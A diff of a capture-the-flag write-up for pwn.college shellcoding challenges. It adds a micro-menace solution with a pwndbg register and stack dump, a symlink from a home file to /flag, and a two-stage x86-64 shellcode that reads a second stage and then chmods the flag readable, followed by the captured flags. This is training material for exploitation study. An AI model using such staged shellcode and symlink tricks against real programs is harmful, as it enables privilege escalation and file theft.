@@ -635,12 +635,15 @@ shellcode_asm = """
 """
 
 shellcode = asm(shellcode_asm)
+
+print("--- SHELLCODE ---", file=sys.stderr)
+print(f"{disasm(shellcode)}\n", file=sys.stderr)
+
 sys.stdout.buffer.write(shellcode)
-print(disasm(shellcode), file=sys.stderr)
 ```
 
 ```
-hacker@program-security~byte-budget:~$ python ~/script.py | /challenge/byte-budget
+hacker@program-security~byte-budget:~$ python ~/script.py | /challenge/byte-budget 
 ###
 ### Welcome to /challenge/byte-budget!
 ###
@@ -653,12 +656,14 @@ other tricks, this will sanitize all environment variables and arguments and clo
 Mapped 0x1000 bytes for shellcode at 0x2e0a9000!
 Reading 0x12 bytes from stdin.
 
+--- SHELLCODE ---
    0:   6a 5a                   push   0x5a
    2:   54                      push   rsp
    3:   5f                      pop    rdi
    4:   58                      pop    rax
    5:   66 be ff 01             mov    si, 0x1ff
    9:   0f 05                   syscall
+
 Removing write permissions from first 4096 bytes of shellcode.
 
 This challenge is about to execute the following shellcode:
@@ -725,7 +730,7 @@ context.os = "linux"
 context.log_level = "error"
 
 shellcode_asm = """
-   /* chmod("z", 0004) */
+   /* chmod("Z", 0004) */
    push 0x5a
    push rsp
    pop rdi
@@ -735,8 +740,11 @@ shellcode_asm = """
 """
 
 shellcode = asm(shellcode_asm)
+
+print("--- SHELLCODE ---", file=sys.stderr)
+print(f"{disasm(shellcode)}\n", file=sys.stderr)
+
 sys.stdout.buffer.write(shellcode)
-print(disasm(shellcode), file=sys.stderr)
 ```
 
 ```
@@ -753,12 +761,14 @@ other tricks, this will sanitize all environment variables and arguments and clo
 Mapped 0x1000 bytes for shellcode at 0x290ad000!
 Reading 0x1000 bytes from stdin.
 
+--- SHELLCODE ---
    0:   6a 5a                   push   0x5a
    2:   54                      push   rsp
    3:   5f                      pop    rdi
    4:   58                      pop    rax
    5:   40 b6 04                mov    sil, 0x4
    8:   0f 05                   syscall
+
 Executing filter...
 
 This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
@@ -823,7 +833,7 @@ context.os = "linux"
 context.log_level = "error"
 
 shellcode_asm = """
-   /* chmod("z", 0004) */
+   /* chmod("Z", 0004) */
    push 0x5a
    push rsp
    pop rdi
@@ -833,8 +843,11 @@ shellcode_asm = """
 """
 
 shellcode = asm(shellcode_asm)
+
+print("--- SHELLCODE ---", file=sys.stderr)
+print(f"{disasm(shellcode)}\n", file=sys.stderr)
+
 sys.stdout.buffer.write(shellcode)
-print(disasm(shellcode), file=sys.stderr)
 ```
 
 ```
@@ -851,12 +864,14 @@ other tricks, this will sanitize all environment variables and arguments and clo
 Mapped 0x1000 bytes for shellcode at 0x22f00000!
 Reading 0x1000 bytes from stdin.
 
+--- SHELLCODE ---
    0:   6a 5a                   push   0x5a
    2:   54                      push   rsp
    3:   5f                      pop    rdi
    4:   58                      pop    rax
    5:   40 b6 04                mov    sil, 0x4
    8:   0f 05                   syscall
+
 Executing filter...
 
 This challenge requires that every byte in your shellcode is unique!
@@ -917,7 +932,7 @@ context.os = "linux"
 context.log_level = "error"
 
 shellcode_asm = """
-   /* chmod("z", 0004) */
+   /* chmod("Z", 0004) */
    push 0x5a
    push rsp
    pop rdi
@@ -927,8 +942,11 @@ shellcode_asm = """
 """
 
 shellcode = asm(shellcode_asm)
+
+print("--- SHELLCODE ---", file=sys.stderr)
+print(f"{disasm(shellcode)}\n", file=sys.stderr)
+
 sys.stdout.buffer.write(shellcode)
-print(disasm(shellcode), file=sys.stderr)
 ```
 
 ```
@@ -945,12 +963,14 @@ other tricks, this will sanitize all environment variables and arguments and clo
 Mapped 0x1000 bytes for shellcode at 0x15233000!
 Reading 0xc bytes from stdin.
 
+--- SHELLCODE ---
    0:   6a 5a                   push   0x5a
    2:   54                      push   rsp
    3:   5f                      pop    rdi
    4:   58                      pop    rax
    5:   40 b6 04                mov    sil, 0x4
    8:   0f 05                   syscall
+
 Removing write permissions from first 4096 bytes of shellcode.
 
 This challenge is about to execute the following shellcode:
@@ -978,8 +998,47 @@ pwn.college{kwjklfeOh4LdJaEQD1NDoUm9jr7.0VOyIDL4ITM0EzW}
 
 ## Micro Menace
 
+For this challenge, we would have to leverage the state of the registers and the stack when the program executes our shellcode. Also, this will be a multi-stage shellcode, where the first astage will fit within 6 bytes, and will read the second stage.
+
+Let's get the state fo the registers and stack.
+
+```py
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+shellcode_asm = """
+    int3
+"""
+
+shellcode = asm(shellcode_asm)
+
+print("--- SHELLCODE ---", file=sys.stderr)
+print(f"{disasm(shellcode)}\n", file=sys.stderr)
+
+sys.stdout.buffer.write(shellcode)
 ```
-hacker@program-security~micro-menace:/$ /challenge/micro-menace 
+
+```
+hacker@program-security~micro-menace:~$ python ~/script.py > /tmp/shellcode.bin
+--- SHELLCODE ---
+   0:   cc                      int3
+```
+
+Now, we have open the program within GDB, and run it with the `/tmp/shellcode.bin` as input. Since our shellcode only has an `int3` instruction, when the program goes to execute our shellcode within GDB, it will serve as a breakpoint.
+
+```
+hacker@program-security~micro-menace:~$ pwndbg /challenge/micro-menace 
+pwndbg: loaded 205 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
+Reading symbols from /challenge/micro-menace...
+(No debugging symbols found in /challenge/micro-menace)
+------- tip of the day (disable with set show-tips off) -------
+GDB's apropos <topic> command displays all registered commands that are related to the given <topic>
+pwndbg> run < /tmp/shellcode.bin
+Starting program: /challenge/micro-menace < /tmp/shellcode.bin
 ###
 ### Welcome to /challenge/micro-menace!
 ###
@@ -991,28 +1050,38 @@ other tricks, this will sanitize all environment variables and arguments and clo
 
 Mapped 0x1000 bytes for shellcode at 0x2a047000!
 Reading 0x6 bytes from stdin.
-```
 
-```
-───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000002a047000 | cc                                            | int3 
+
+Executing shellcode!
+
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x000000002a047001 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
  RAX  0
- RBX  0x5c48118237e0 (__libc_csu_init) ◂— endbr64 
- RCX  0x7bbac5b94297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RBX  0x604cbc2bb7e0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x70b55acc8297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
  RDX  0x2a047000 ◂— 0xcc
- RDI  0x7bbac5c747e0 (_IO_stdfile_1_lock) ◂— 0
- RSI  0x7bbac5c73723 (_IO_2_1_stdout_+131) ◂— 0xc747e0000000000a /* '\n' */
+ RDI  0x70b55ada87e0 (_IO_stdfile_1_lock) ◂— 0
+ RSI  0x70b55ada7723 (_IO_2_1_stdout_+131) ◂— 0xda87e0000000000a /* '\n' */
  R8   0x16
  R9   9
- R10  0x5c4811824113 ◂— 0x525245000000000a /* '\n' */
+ R10  0x604cbc2bc113 ◂— 0x525245000000000a /* '\n' */
  R11  0x246
- R12  0x5c4811823200 (_start) ◂— endbr64 
- R13  0x7fff21d935c0 ◂— 1
+ R12  0x604cbc2bb200 (_start) ◂— endbr64 
+ R13  0x7fff7bdd2c80 ◂— 1
  R14  0
  R15  0
- RBP  0x7fff21d934d0 ◂— 0
- RSP  0x7fff21d93488 —▸ 0x5c48118237c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
+ RBP  0x7fff7bdd2b90 ◂— 0
+ RSP  0x7fff7bdd2b48 —▸ 0x604cbc2bb7c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
  RIP  0x2a047001 ◂— 0
-────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  ► 0x2a047001    add    byte ptr [rax], al
    0x2a047003    add    byte ptr [rax], al
    0x2a047005    add    byte ptr [rax], al
@@ -1024,18 +1093,119 @@ Reading 0x6 bytes from stdin.
    0x2a047011    add    byte ptr [rax], al
    0x2a047013    add    byte ptr [rax], al
    0x2a047015    add    byte ptr [rax], al
-──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
-00:0000│ rsp 0x7fff21d93488 —▸ 0x5c48118237c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
-01:0008│-040 0x7fff21d93490 —▸ 0x7fff21d934b6 ◂— 0x2710118232000000
-02:0010│-038 0x7fff21d93498 —▸ 0x7fff21d935d8 —▸ 0x7fff21d94690 ◂— 0
-03:0018│-030 0x7fff21d934a0 —▸ 0x7fff21d935c8 —▸ 0x7fff21d94678 ◂— 0
-04:0020│-028 0x7fff21d934a8 ◂— 0x1118237e0
-05:0028│-020 0x7fff21d934b0 ◂— 0
-06:0030│-018 0x7fff21d934b8 ◂— 0x271011823200
-07:0038│-010 0x7fff21d934c0 —▸ 0x7fff21d935d0 ◂— 0
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff7bdd2b48 —▸ 0x604cbc2bb7c3 (main+636) ◂— lea rdi, [rip + 0xcf2]
+01:0008│-040 0x7fff7bdd2b50 —▸ 0x7fff7bdd2b76 ◂— 0x2710bc2bb2000000
+02:0010│-038 0x7fff7bdd2b58 —▸ 0x7fff7bdd2c98 —▸ 0x7fff7bdd3699 ◂— 0
+03:0018│-030 0x7fff7bdd2b60 —▸ 0x7fff7bdd2c88 —▸ 0x7fff7bdd3681 ◂— 0
+04:0020│-028 0x7fff7bdd2b68 ◂— 0x1bc2bb7e0
+05:0028│-020 0x7fff7bdd2b70 ◂— 0
+06:0030│-018 0x7fff7bdd2b78 ◂— 0x2710bc2bb200
+07:0038│-010 0x7fff7bdd2b80 —▸ 0x7fff7bdd2c90 ◂— 0
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0       0x2a047001 None
+   1   0x604cbc2bb7c3 main+636
+   2   0x70b55abde083 __libc_start_main+243
+   3   0x604cbc2bb22e _start+46
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-&nbsp;
+### Exploit
+
+```
+hacker@program-security~micro-menace:~$ ln -sf /flag ~/Z
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import sys
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+# --- STAGE 1: The 6-byte Loader ---
+# Exactly 6 bytes. It calls read(0, rsi, rdx)
+# rsi is already set to the start of the shellcode (0x2a047000)
+shellcode_stage_1_asm = """
+    push rdx
+    pop rsi    /* 2 bytes */
+    push rax
+    pop rdi    /* 2 bytes: rdi = 0 */
+    syscall    /* 2 bytes */
+"""
+shellcode_stage_1 = asm(shellcode_stage_1_asm)
+
+# --- STAGE 2: The chmod trick ---
+# Note: The syscall in Stage 1 is at offset 4. 
+# It finishes at offset 6. We need to pad Stage 2.
+shellcode_stage_2_asm = """
+    .rept 6
+    nop
+    .endr
+    
+    /* chmod("Z", 4) */
+    push 0x5a       /* 'Z' */
+    push rsp
+    pop rdi         /* rdi = pointer to "Z" */
+    
+    /* Stage 1's read returns to RAX, so we must reset RAX to 90 */
+    push 90
+    pop rax         /* rax = 90 (chmod) */
+    
+    mov sil, 4      /* mode = 0004 (read by others) */
+    syscall
+    
+    /* exit(0) */
+    push 60
+    pop rax
+    syscall
+"""
+shellcode_stage_2 = asm(shellcode_stage_2_asm)
+
+print("--- SHELLCODE (STAGE 1) ---", file=sys.stderr)
+print(disasm(shellcode_stage_1), file=sys.stderr)
+
+sys.stdout.buffer.write(shellcode_stage_1 + shellcode_stage_2)
+```
+
+```
+hacker@program-security~micro-menace:~$ python ~/script.py | /challenge/micro-menace 
+###
+### Welcome to /challenge/micro-menace!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x2a047000!
+Reading 0x6 bytes from stdin.
+
+--- SHELLCODE (STAGE 1) ---
+   0:   52                      push   rdx
+   1:   5e                      pop    rsi
+   2:   50                      push   rax
+   3:   5f                      pop    rdi
+   4:   0f 05                   syscall
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000002a047000 | 52                                            | push rdx
+0x000000002a047001 | 5e                                            | pop rsi
+0x000000002a047002 | 50                                            | push rax
+0x000000002a047003 | 5f                                            | pop rdi
+0x000000002a047004 | 0f 05                                         | syscall 
+
+Executing shellcode!
+```
+
+```
+hacker@program-security~micro-menace:~$ cat ~/Z
+pwn.college{cyI5_guEC-KNBsUAUs1Xhqtspc9.0FMzIDL4ITM0EzW}
+```
 
 ## Login Leakage (Easy)
 
